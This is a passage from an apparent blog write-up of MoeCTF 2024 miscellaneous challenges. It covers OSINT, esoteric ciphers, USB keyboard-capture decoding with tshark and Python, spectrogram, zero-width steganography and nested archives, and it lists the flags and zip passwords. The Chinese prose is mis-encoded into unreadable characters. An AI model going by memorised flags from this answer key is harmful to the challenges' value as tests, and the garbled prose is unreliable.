<p><a href="https://www.britishnewspaperarchive.co.uk/viewer/bl/0001578/19460420/043/0015">https://www.britishnewspaperarchive.co.uk/viewer/bl/0001578/19460420/043/0015</a></p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/7.png"></p>
<p>è¯»è¯»èƒ½çŸ¥é“æ˜¯ç‹å»ºå¢“ï¼Œç™¾åº¦ç™¾ç§‘é‡Œä¿¡æ¯åŸºæœ¬å’Œç”»æŠ¥ç¬¦åˆï¼Œé«˜å¾·åœ°å›¾çœ‹çœ‹å°±æ‰¾åˆ°ä¸­åŒ»é¦†äº†ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/8.png"></p>
<p>moectf{han_fang_tang}</p>
<hr>
<h2 id="ctfer2077-2">ctfer2077â‘¢<a hidden class="anchor" aria-hidden="true" href="#ctfer2077-2">#</a></h2>
<p>æµé‡é‡Œhttpåè®®ä¼ äº†ä¸ªzipï¼Œå¯¼å‡ºè§£å‹æ‹¿åˆ°ä¸€ä¸ªgifï¼Œä¸€ä¸ªzipï¼Œä¸€ä¸ªmp3ï¼Œgifæœ‰ä¸€å¸§é‡Œèƒ½çœ‹åˆ°keyï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/9.png"></p>
<p>mp3å¬å¬æ²¡å•¥é—®é¢˜ï¼Œç›´æ¥è¯•è¯•MP3stegoï¼Œè§£å‡ºä¸ªbrainfuckï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-brainfuck" data-lang="brainfuck"><span style="display:flex;"><span>+++++<span style="color:#75715e"> </span>+++<span style="color:#66d9ef">[</span>-<span style="color:#75715e"> </span>&gt;++++<span style="color:#75715e"> </span>++++&lt;<span style="color:#75715e"> </span><span style="color:#66d9ef">]</span>&gt;+++<span style="color:#75715e"> </span>+++++<span style="color:#75715e"> </span><span style="color:#f92672">.</span>&lt;+++<span style="color:#75715e"> </span>+<span style="color:#66d9ef">[</span>-&gt;-<span style="color:#75715e"> </span>---&lt;<span style="color:#66d9ef">]</span><span style="color:#75715e"> </span>&gt;---<span style="color:#f92672">.</span><span style="color:#75715e"> </span>&lt;++++<span style="color:#75715e"> </span>+++<span style="color:#66d9ef">[</span>-<span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&gt;++++<span style="color:#75715e"> </span>+++&lt;<span style="color:#66d9ef">]</span><span style="color:#75715e"> </span>&gt;+<span style="color:#f92672">.</span>&lt;+<span style="color:#75715e"> </span>++++<span style="color:#66d9ef">[</span><span style="color:#75715e"> </span>-&gt;---<span style="color:#75715e"> </span>--&lt;<span style="color:#66d9ef">]</span>&gt;<span style="color:#75715e"> </span>-----<span style="color:#75715e"> </span>-<span style="color:#f92672">.</span>&lt;++<span style="color:#75715e"> </span>+<span style="color:#66d9ef">[</span>-&gt;+<span style="color:#75715e"> </span>++&lt;<span style="color:#66d9ef">]</span>&gt;<span style="color:#75715e"> </span>+++++<span style="color:#75715e"> </span>+<span style="color:#f92672">.</span>&lt;++<span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>+<span style="color:#66d9ef">[</span>-&gt;-<span style="color:#75715e"> </span>--&lt;<span style="color:#66d9ef">]</span>&gt;<span style="color:#75715e"> </span>-<span style="color:#f92672">.</span>&lt;++<span style="color:#75715e"> </span>++<span style="color:#66d9ef">[</span>-&gt;<span style="color:#75715e"> </span>----&lt;<span style="color:#75715e"> </span><span style="color:#66d9ef">]</span>&gt;---<span style="color:#75715e"> </span>-<span style="color:#f92672">.</span>&lt;++<span style="color:#75715e"> </span>++++<span style="color:#66d9ef">[</span><span style="color:#75715e"> </span>-&gt;+++<span style="color:#75715e"> </span>+++&lt;<span style="color:#66d9ef">]</span><span style="color:#75715e"> </span>&gt;++++<span style="color:#75715e"> </span>+<span style="color:#f92672">.</span>&lt;<span style="color:#75715e">
</span></span></span></code></pre></div><p>è§£å‡ºæ¥æ–°çš„keyï¼š</p>
<pre tabindex="0"><code>H5gHWM9b
</code></pre><p>æ‹¿å»è§£å‹zipï¼Œé‡Œé¢ä¸‰æ®µflagï¼Œæ˜¯ç¦å°”æ‘©æ–¯é‡Œè·³èˆçš„å°äººå¯†ç ï¼Œä¸è¿‡æ„Ÿè§‰ç”»çš„ä¸æ˜¯å¾ˆè§„èŒƒï¼Œé‚£ä¸ªPå­—æ¯å®Œå…¨æ˜¯çŒœå‡ºæ¥çš„ï¼Œæœ€åçŒœå‡ºflagï¼Œè¿™æ˜¯å…¶ä¸­ä¸€æ®µï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/10.png"></p>
<p>moectf{PEOPLE_DANCING_HAPPILY}</p>
<hr>
<h2 id="ez_usbpcap">ez_usbpcap<a hidden class="anchor" aria-hidden="true" href="#ez_usbpcap">#</a></h2>
<p>usbæµé‡ï¼Œç”¨tsharkæå–å‡ºé”®ç›˜çš„ <code>usbhid data</code> ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tshark -r flag.pcapng -T fields -Y <span style="color:#e6db74">&#34;usb.src==2.1.1&#34;</span> -e usbhid.data &gt; usb.txt
</span></span></code></pre></div><p>æå–å‡ºçš„ <code>usb.txt</code> å†…å®¹ï¼Œï¼š</p>
<pre tabindex="0"><code>00005e0000000000
0000000000000000
0000070000000000
0000000000000000
00005e0000000000
0000000000000000
0000090000000000
0000000000000000
00005e0000000000
0000000000000000
00005d0000000000
0000000000000000
00005e0000000000
0000000000000000
00005b0000000000
0000000000000000
00005f0000000000
0000000000000000
00005c0000000000
0000000000000000
00005e0000000000
0000000000000000
00005e0000000000
0000000000000000
00005f0000000000
0000000000000000
0000050000000000
0000000000000000
00005e0000000000
0000000000000000
0000080000000000
0000000000000000
00005b0000000000
0000000000000000
0000590000000000
0000000000000000
00005e0000000000
0000000000000000
0000600000000000
0000000000000000
00005e0000000000
0000000000000000
0000590000000000
0000000000000000
00005b0000000000
0000000000000000
0000620000000000
0000000000000000
00005f0000000000
0000000000000000
00005f0000000000
0000000000000000
00005b0000000000
0000000000000000
0000620000000000
0000000000000000
00005f0000000000
0000000000000000
0000610000000000
0000000000000000
00005b0000000000
0000000000000000
0000620000000000
0000000000000000
00005f0000000000
0000000000000000
00005d0000000000
0000000000000000
00005e0000000000
0000000000000000
00005c0000000000
0000000000000000
00005e0000000000
0000000000000000
0000610000000000
0000000000000000
00005e0000000000
0000000000000000
0000590000000000
0000000000000000
00005e0000000000
0000000000000000
0000080000000000
0000000000000000
00005e0000000000
0000000000000000
0000060000000000
0000000000000000
00005b0000000000
0000000000000000
00005b0000000000
0000000000000000
00005b0000000000
0000000000000000
00005a0000000000
0000000000000000
00005b0000000000
0000000000000000
00005c0000000000
0000000000000000
00005b0000000000
0000000000000000
00005d0000000000
0000000000000000
00005b0000000000
0000000000000000
0000590000000000
0000000000000000
00005f0000000000
0000000000000000
0000070000000000
0000000000000000
</code></pre><p>å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€äº›ä¸å¸¸è§çš„dataå€¼ï¼Œæ¯”å¦‚5eï¼Œè‡ªå·±ä»ç è¡¨é‡Œæ‰¾å‡ºå¯¹åº”é”®ç›˜æŒ‰é”®å†è¡¥åˆ°è„šæœ¬é‡Œå»å³å¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>normalKeys <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;04&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;05&#34;</span>: <span style="color:#e6db74">&#34;b&#34;</span>, <span style="color:#e6db74">&#34;06&#34;</span>: <span style="color:#e6db74">&#34;c&#34;</span>, <span style="color:#e6db74">&#34;07&#34;</span>: <span style="color:#e6db74">&#34;d&#34;</span>, <span style="color:#e6db74">&#34;08&#34;</span>: <span style="color:#e6db74">&#34;e&#34;</span>, <span style="color:#e6db74">&#34;09&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;f&#34;</span>, <span style="color:#e6db74">&#34;0a&#34;</span>: <span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;0b&#34;</span>: <span style="color:#e6db74">&#34;h&#34;</span>, <span style="color:#e6db74">&#34;0c&#34;</span>: <span style="color:#e6db74">&#34;i&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0d&#34;</span>: <span style="color:#e6db74">&#34;j&#34;</span>, <span style="color:#e6db74">&#34;0e&#34;</span>: <span style="color:#e6db74">&#34;k&#34;</span>, <span style="color:#e6db74">&#34;0f&#34;</span>: <span style="color:#e6db74">&#34;l&#34;</span>, <span style="color:#e6db74">&#34;10&#34;</span>: <span style="color:#e6db74">&#34;m&#34;</span>, <span style="color:#e6db74">&#34;11&#34;</span>: <span style="color:#e6db74">&#34;n&#34;</span>, <span style="color:#e6db74">&#34;12&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;o&#34;</span>, <span style="color:#e6db74">&#34;13&#34;</span>: <span style="color:#e6db74">&#34;p&#34;</span>, <span style="color:#e6db74">&#34;14&#34;</span>: <span style="color:#e6db74">&#34;q&#34;</span>, <span style="color:#e6db74">&#34;15&#34;</span>: <span style="color:#e6db74">&#34;r&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;16&#34;</span>: <span style="color:#e6db74">&#34;s&#34;</span>, <span style="color:#e6db74">&#34;17&#34;</span>: <span style="color:#e6db74">&#34;t&#34;</span>, <span style="color:#e6db74">&#34;18&#34;</span>: <span style="color:#e6db74">&#34;u&#34;</span>, <span style="color:#e6db74">&#34;19&#34;</span>: <span style="color:#e6db74">&#34;v&#34;</span>, <span style="color:#e6db74">&#34;1a&#34;</span>: <span style="color:#e6db74">&#34;w&#34;</span>, <span style="color:#e6db74">&#34;1b&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;1c&#34;</span>: <span style="color:#e6db74">&#34;y&#34;</span>, <span style="color:#e6db74">&#34;1d&#34;</span>: <span style="color:#e6db74">&#34;z&#34;</span>, <span style="color:#e6db74">&#34;1e&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;1f&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;20&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">&#34;21&#34;</span>: <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;22&#34;</span>: <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;23&#34;</span>: <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;24&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;25&#34;</span>: <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;26&#34;</span>: <span style="color:#e6db74">&#34;9&#34;</span>, <span style="color:#e6db74">&#34;27&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;28&#34;</span>: <span style="color:#e6db74">&#34;&lt;RET&gt;&#34;</span>, <span style="color:#e6db74">&#34;29&#34;</span>: <span style="color:#e6db74">&#34;&lt;ESC&gt;&#34;</span>, <span style="color:#e6db74">&#34;2a&#34;</span>: <span style="color:#e6db74">&#34;&lt;DEL&gt;&#34;</span>, <span style="color:#e6db74">&#34;2b&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;2c&#34;</span>: <span style="color:#e6db74">&#34;&lt;SPACE&gt;&#34;</span>, <span style="color:#e6db74">&#34;2d&#34;</span>: <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;2e&#34;</span>: <span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;2f&#34;</span>: <span style="color:#e6db74">&#34;[&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;30&#34;</span>: <span style="color:#e6db74">&#34;]&#34;</span>, <span style="color:#e6db74">&#34;31&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;32&#34;</span>: <span style="color:#e6db74">&#34;&lt;NON&gt;&#34;</span>, <span style="color:#e6db74">&#34;33&#34;</span>: <span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;34&#34;</span>: <span style="color:#e6db74">&#34;&#39;&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;35&#34;</span>: <span style="color:#e6db74">&#34;&lt;GA&gt;&#34;</span>, <span style="color:#e6db74">&#34;36&#34;</span>: <span style="color:#e6db74">&#34;,&#34;</span>, <span style="color:#e6db74">&#34;37&#34;</span>: <span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#e6db74">&#34;38&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;39&#34;</span>: <span style="color:#e6db74">&#34;&lt;CAP&gt;&#34;</span>, <span style="color:#e6db74">&#34;3a&#34;</span>: <span style="color:#e6db74">&#34;&lt;F1&gt;&#34;</span>, <span style="color:#e6db74">&#34;3b&#34;</span>: <span style="color:#e6db74">&#34;&lt;F2&gt;&#34;</span>, <span style="color:#e6db74">&#34;3c&#34;</span>: <span style="color:#e6db74">&#34;&lt;F3&gt;&#34;</span>, <span style="color:#e6db74">&#34;3d&#34;</span>: <span style="color:#e6db74">&#34;&lt;F4&gt;&#34;</span>, <span style="color:#e6db74">&#34;3e&#34;</span>: <span style="color:#e6db74">&#34;&lt;F5&gt;&#34;</span>, <span style="color:#e6db74">&#34;3f&#34;</span>: <span style="color:#e6db74">&#34;&lt;F6&gt;&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;40&#34;</span>: <span style="color:#e6db74">&#34;&lt;F7&gt;&#34;</span>, <span style="color:#e6db74">&#34;41&#34;</span>: <span style="color:#e6db74">&#34;&lt;F8&gt;&#34;</span>, <span style="color:#e6db74">&#34;42&#34;</span>: <span style="color:#e6db74">&#34;&lt;F9&gt;&#34;</span>, <span style="color:#e6db74">&#34;43&#34;</span>: <span style="color:#e6db74">&#34;&lt;F10&gt;&#34;</span>, <span style="color:#e6db74">&#34;44&#34;</span>: <span style="color:#e6db74">&#34;&lt;F11&gt;&#34;</span>, <span style="color:#e6db74">&#34;45&#34;</span>: <span style="color:#e6db74">&#34;&lt;F12&gt;&#34;</span>, <span style="color:#e6db74">&#34;59&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;5a&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;5b&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">&#34;5c&#34;</span>: <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;5d&#34;</span>: <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;5e&#34;</span>: <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;5f&#34;</span>: <span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;60&#34;</span>: <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;61&#34;</span>: <span style="color:#e6db74">&#34;9&#34;</span>, <span style="color:#e6db74">&#34;62&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>}
</span></span><span style="display:flex;"><span>shiftKeys <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;04&#34;</span>: <span style="color:#e6db74">&#34;A&#34;</span>, <span style="color:#e6db74">&#34;05&#34;</span>: <span style="color:#e6db74">&#34;B&#34;</span>, <span style="color:#e6db74">&#34;06&#34;</span>: <span style="color:#e6db74">&#34;C&#34;</span>, <span style="color:#e6db74">&#34;07&#34;</span>: <span style="color:#e6db74">&#34;D&#34;</span>, <span style="color:#e6db74">&#34;08&#34;</span>: <span style="color:#e6db74">&#34;E&#34;</span>, <span style="color:#e6db74">&#34;09&#34;</span>: <span style="color:#e6db74">&#34;F&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0a&#34;</span>: <span style="color:#e6db74">&#34;G&#34;</span>, <span style="color:#e6db74">&#34;0b&#34;</span>: <span style="color:#e6db74">&#34;H&#34;</span>, <span style="color:#e6db74">&#34;0c&#34;</span>: <span style="color:#e6db74">&#34;I&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0d&#34;</span>: <span style="color:#e6db74">&#34;J&#34;</span>, <span style="color:#e6db74">&#34;0e&#34;</span>: <span style="color:#e6db74">&#34;K&#34;</span>, <span style="color:#e6db74">&#34;0f&#34;</span>: <span style="color:#e6db74">&#34;L&#34;</span>, <span style="color:#e6db74">&#34;10&#34;</span>: <span style="color:#e6db74">&#34;M&#34;</span>, <span style="color:#e6db74">&#34;11&#34;</span>: <span style="color:#e6db74">&#34;N&#34;</span>, <span style="color:#e6db74">&#34;12&#34;</span>: <span style="color:#e6db74">&#34;O&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;13&#34;</span>: <span style="color:#e6db74">&#34;P&#34;</span>, <span style="color:#e6db74">&#34;14&#34;</span>: <span style="color:#e6db74">&#34;Q&#34;</span>, <span style="color:#e6db74">&#34;15&#34;</span>: <span style="color:#e6db74">&#34;R&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;16&#34;</span>: <span style="color:#e6db74">&#34;S&#34;</span>, <span style="color:#e6db74">&#34;17&#34;</span>: <span style="color:#e6db74">&#34;T&#34;</span>, <span style="color:#e6db74">&#34;18&#34;</span>: <span style="color:#e6db74">&#34;U&#34;</span>, <span style="color:#e6db74">&#34;19&#34;</span>: <span style="color:#e6db74">&#34;V&#34;</span>, <span style="color:#e6db74">&#34;1a&#34;</span>: <span style="color:#e6db74">&#34;W&#34;</span>, <span style="color:#e6db74">&#34;1b&#34;</span>: <span style="color:#e6db74">&#34;X&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;1c&#34;</span>: <span style="color:#e6db74">&#34;Y&#34;</span>, <span style="color:#e6db74">&#34;1d&#34;</span>: <span style="color:#e6db74">&#34;Z&#34;</span>, <span style="color:#e6db74">&#34;1e&#34;</span>: <span style="color:#e6db74">&#34;!&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;1f&#34;</span>: <span style="color:#e6db74">&#34;@&#34;</span>, <span style="color:#e6db74">&#34;20&#34;</span>: <span style="color:#e6db74">&#34;#&#34;</span>, <span style="color:#e6db74">&#34;21&#34;</span>: <span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;22&#34;</span>: <span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#34;23&#34;</span>: <span style="color:#e6db74">&#34;^&#34;</span>, <span style="color:#e6db74">&#34;24&#34;</span>: <span style="color:#e6db74">&#34;&amp;&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;25&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;26&#34;</span>: <span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;27&#34;</span>: <span style="color:#e6db74">&#34;)&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;28&#34;</span>: <span style="color:#e6db74">&#34;&lt;RET&gt;&#34;</span>, <span style="color:#e6db74">&#34;29&#34;</span>: <span style="color:#e6db74">&#34;&lt;ESC&gt;&#34;</span>, <span style="color:#e6db74">&#34;2a&#34;</span>: <span style="color:#e6db74">&#34;&lt;DEL&gt;&#34;</span>, <span style="color:#e6db74">&#34;2b&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;2c&#34;</span>: <span style="color:#e6db74">&#34;&lt;SPACE&gt;&#34;</span>, <span style="color:#e6db74">&#34;2d&#34;</span>: <span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;2e&#34;</span>: <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;2f&#34;</span>: <span style="color:#e6db74">&#34;{&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;30&#34;</span>: <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;31&#34;</span>: <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;32&#34;</span>: <span style="color:#e6db74">&#34;&lt;NON&gt;&#34;</span>, <span style="color:#e6db74">&#34;33&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;34&#34;</span>: <span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;35&#34;</span>:
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;~&#34;</span>, <span style="color:#e6db74">&#34;36&#34;</span>: <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;37&#34;</span>: <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;38&#34;</span>: <span style="color:#e6db74">&#34;?&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;39&#34;</span>: <span style="color:#e6db74">&#34;&lt;CAP&gt;&#34;</span>, <span style="color:#e6db74">&#34;3a&#34;</span>: <span style="color:#e6db74">&#34;&lt;F1&gt;&#34;</span>, <span style="color:#e6db74">&#34;3b&#34;</span>: <span style="color:#e6db74">&#34;&lt;F2&gt;&#34;</span>, <span style="color:#e6db74">&#34;3c&#34;</span>: <span style="color:#e6db74">&#34;&lt;F3&gt;&#34;</span>, <span style="color:#e6db74">&#34;3d&#34;</span>: <span style="color:#e6db74">&#34;&lt;F4&gt;&#34;</span>, <span style="color:#e6db74">&#34;3e&#34;</span>: <span style="color:#e6db74">&#34;&lt;F5&gt;&#34;</span>, <span style="color:#e6db74">&#34;3f&#34;</span>: <span style="color:#e6db74">&#34;&lt;F6&gt;&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;40&#34;</span>: <span style="color:#e6db74">&#34;&lt;F7&gt;&#34;</span>, <span style="color:#e6db74">&#34;41&#34;</span>: <span style="color:#e6db74">&#34;&lt;F8&gt;&#34;</span>, <span style="color:#e6db74">&#34;42&#34;</span>: <span style="color:#e6db74">&#34;&lt;F9&gt;&#34;</span>, <span style="color:#e6db74">&#34;43&#34;</span>: <span style="color:#e6db74">&#34;&lt;F10&gt;&#34;</span>, <span style="color:#e6db74">&#34;44&#34;</span>: <span style="color:#e6db74">&#34;&lt;F11&gt;&#34;</span>, <span style="color:#e6db74">&#34;45&#34;</span>: <span style="color:#e6db74">&#34;&lt;F12&gt;&#34;</span>, <span style="color:#e6db74">&#34;59&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;5a&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;5b&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">&#34;5c&#34;</span>: <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;5d&#34;</span>: <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;5e&#34;</span>: <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;5f&#34;</span>: <span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;60&#34;</span>: <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;61&#34;</span>: <span style="color:#e6db74">&#34;9&#34;</span>, <span style="color:#e6db74">&#34;62&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;usb.txt&#34;</span>,<span style="color:#e6db74">&#34;r+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> line[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">+=</span> normalKeys[key]
</span></span><span style="display:flex;"><span>print (flag)
</span></span></code></pre></div><p>è¿è¡Œç»“æœï¼š</p>
<pre tabindex="0"><code class="language-hex" data-lang="hex">6d6f656374667b6e3168613077307930756469616e6c33323435317d
</code></pre><p>å†è½¬ä¸€ä¸‹hexå°±èƒ½æ‹¿åˆ°flagï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/16.png"></p>
<hr>
<h2 id="abnormal-lag">Abnormal lag<a hidden class="anchor" aria-hidden="true" href="#abnormal-lag">#</a></h2>
<p>é¢‘è°±å›¾ç›´æ¥çœ‹ï¼Œæ³¨æ„é¢˜ç›®ç»™å‡ºçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<pre tabindex="0"><code>flagæ ¼å¼:moectf{[\da-f-]+}
</code></pre><p>moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p>
<hr>
<h2 id="so-many-m">so many &rsquo;m'<a hidden class="anchor" aria-hidden="true" href="#so-many-m">#</a></h2>
<p>å­—é¢‘ç»Ÿè®¡ï¼Œç„¶åç…§ç€æ‹¼å°±æ˜¯flagï¼Œæ³¨æ„Må’Œpçš„ä½ç½®è¦æ¢ä¸€ä¸‹ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/11.png"></p>
<p>moectf{C0MpuTaskingD4rE}</p>
<hr>
<h2 id="å°å°å¥—å¨ƒ">å°å°å¥—å¨ƒ<a hidden class="anchor" aria-hidden="true" href="#å°å°å¥—å¨ƒ">#</a></h2>
<p>png chunkå—æœ€åä¸€ä¸ªæ˜æ˜¾ä¸å¯¹åŠ²ï¼Œbinwalkå‡ºæ¥ä¸€ä¸ªzlibæ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹é‡Œæœ‰è§£å‹å¥½çš„æ–‡ä»¶ï¼Œæ‹¿å‡ºæ¥å‘ç°æ˜¯ä¸ªpngæ–‡ä»¶ï¼Œcyberchefè½¬ä¸€ä¸‹ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/12.png"></p>
<p>å›¾ç‰‡æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œç›´æ¥æ‰«æ‹¿åˆ°ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å¯†ç ï¼š</p>
<pre tabindex="0"><code>é€ä½ ä¸€ä¸ªkeyï¼you&#39;ve got the zipkey:874jfy37yf37y7
</code></pre><p>ç¬¬äºŒä¸ªtxtæ–‡ä»¶æ˜¯ä¸ªé›¶å®½å­—ç¬¦éšå†™ï¼Œlinuxä¸‹vimæ‰“å¼€ç¼–è¾‘æ–‡ä»¶å¯ä»¥çœ‹åˆ°æœ‰å“ªäº›é›¶å®½å­—ç¬¦ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/13.png"></p>
<p>ä¸è¿‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‹¾ä¸Šäº†å¯¹åº”çš„é›¶å®½å­—ç¬¦åœ¨çº¿ç½‘ç«™è§£ä¸å‡ºï¼Œæ¢äº†ä¸ªç½‘ç«™ç›´æ¥å‡ºäº†ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/14.png"></p>
<p>æ‹¿åˆ°ç¬¬äºŒä¸ªå‹ç¼©åŒ…å¯†ç ï¼š</p>
<pre tabindex="0"><code>idon&#39;tknowmaybeits:dhufhduh48589
</code></pre><p>è§£å‹æ‹¿åˆ°flag.txtï¼Œé‡Œé¢æ˜¯æ–°ä½›æ›°åŠ å¯†çš„å†…å®¹ï¼Œç›´æ¥è§£å°±æ‹¿åˆ°flagï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/15.png"></p>
<hr>
<h2 id="moejail_lv25">moejail_lv2.5<a hidden class="anchor" aria-hidden="true" href="#moejail_lv25">#</a></h2>
<p>æç¤ºé‡Œç»™äº†æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
